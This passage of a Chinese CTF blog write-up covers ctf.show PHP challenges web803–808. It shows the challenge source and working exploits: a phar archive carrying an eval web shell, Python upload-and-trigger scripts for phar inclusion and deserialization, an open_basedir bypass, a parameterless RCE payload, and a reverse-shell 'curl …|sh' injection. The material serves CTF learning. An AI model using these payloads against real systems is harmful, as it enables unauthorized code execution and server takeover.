class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;__=system&amp;_=cat flag.php</span><br></pre></td></tr></table></figure><p><strong>这里的payload是从rce极限挑战里面拿出来的  一般情况下，rce极限挑战里的payload都可以通杀大部分题目</strong></p><h2 id="web803-phar文件包含"><a href="#web803-phar文件包含" class="headerlink" title="web803( phar文件包含)"></a>web803( <strong>phar文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题的思路：过滤了php和data，不能利用这几个协议，在文件包含中，还可以使用<strong>zip协议和phar协议(</strong>远程文件包含这个不行)</p><p><strong>file</strong>协议直接读文件，但是有个file_exists需要存在一个txt文件</p><p>而且测试了一下，只能往<strong>/tmp</strong>中去写入文件，网站目录<strong>/var/www/html</strong>写不进去的</p><p>日志包含也还是收到<strong>txt</strong>后缀的影响</p><p>所以整体的思路，先利用<strong>file_put_contents</strong>讲执行命令的语句写入到文件中，然后再通过<strong>include</strong>包含</p><p>(就是进行两次发包，第一次先把利用file_put_contents把内容写入tmp下的phar内，第二次在进行发包，进行include包含，然后进行命令执行)</p><p><strong>phar协议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成这个phar包得先修改一下php.ini的设置</p><p><img src="../images/image-20230305155029273.png" alt="image-20230305155029273"></p><p>原本这里是On的，把他修改成Off就行</p><p>然后在重启phpstudy就行了</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://2ed54b8f-1578-49c9-8386-ce7c9c6f68c6.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;/tmp/shell.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;phar:///tmp/shell.phar/a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url=url,data=data1)</span><br><span class="line">r = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里记得得把生成的phar包，放到这个脚本所在的目录下。</p><p>phar实现文件包含原理：当与包含函数结合后，会直接执行phar中的内容，达到命令执行的效果</p><h2 id="web804-phar反序列化"><a href="#web804-phar反序列化" class="headerlink" title="web804(phar反序列化)"></a>web804(phar反序列化)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用特点：有<code>file_put_contents</code>实现文件上传的目的，将<code>phar</code>文件上传到题目服务器上，然后<code>file_exists</code>和<code>unlink</code>的影响函数，都可以触发<code>phar的反序列化</code>，从而达到反序列化中的命令执行</p><p>phar文件的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话是先写一个反序列化链子，然后在把phar的部分拼接上去</p><p>然后上传，触发命令执行，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://bf1f07fe-9a6c-4425-994b+7886f64b2923.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和phar文件包含差不多的意思，对于这个脚本来说。</p><p>(这里上一题的生成phar包的方式是一模一样的)</p><h2 id="web805-open-basedir绕过"><a href="#web805-open-basedir绕过" class="headerlink" title="web805(open_basedir绕过)"></a>web805(<strong>open_basedir绕过</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这题有点简略</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/125577789">这篇文章写的非常详细了，有好多种方法，可以去尝试尝试</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">这篇文章也是</a></p><p><img src="../images/image-20230305161156758.png" alt="image-20230305161156758"></p><p>发现只有当前目录可读。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/ctfshowflag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的话尾部可控，可以进行想要的指令进行输入输出。  </p><p>例如查看根目录的话  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p>只要尾部代码换掉就行</p><h2 id="web806-无参RCE"><a href="#web806-无参RCE" class="headerlink" title="web806(无参RCE)"></a>web806(无参RCE)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360">文章</a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">文章2</a></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;shell=cat /c*;</span><br></pre></td></tr></table></figure><p>这里的shell参数的名字可以随便改，因为这样写的话是加一个数组参数在最后面，然后end的时候就会选到他。</p><p>然后最后就会</p><p><code>eval(system(cat /c*))</code></p><p>然后进行命令执行了</p><h2 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807(反弹shell)"></a>web807(反弹shell)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span><br></pre></td></tr></table></figure><p>这是其中一个反弹shell的方法。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https:<span class="comment">//;curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span></span><br></pre></td></tr></table></figure><p>这里话是可以在自己的服务器上进行命令执行了。</p><p><img src="../images/image-20230305170129849.png" alt="image-20230305170129849"></p><p>这两篇文章还有其他的反弹shell的方法  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">文章1</a>  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">文章2</a></p><h2 id="web808-卡临时文件包含"><a href="#web808-卡临时文件包含" class="headerlink" title="web808(卡临时文件包含)"></a>web808(<strong>卡临时文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: 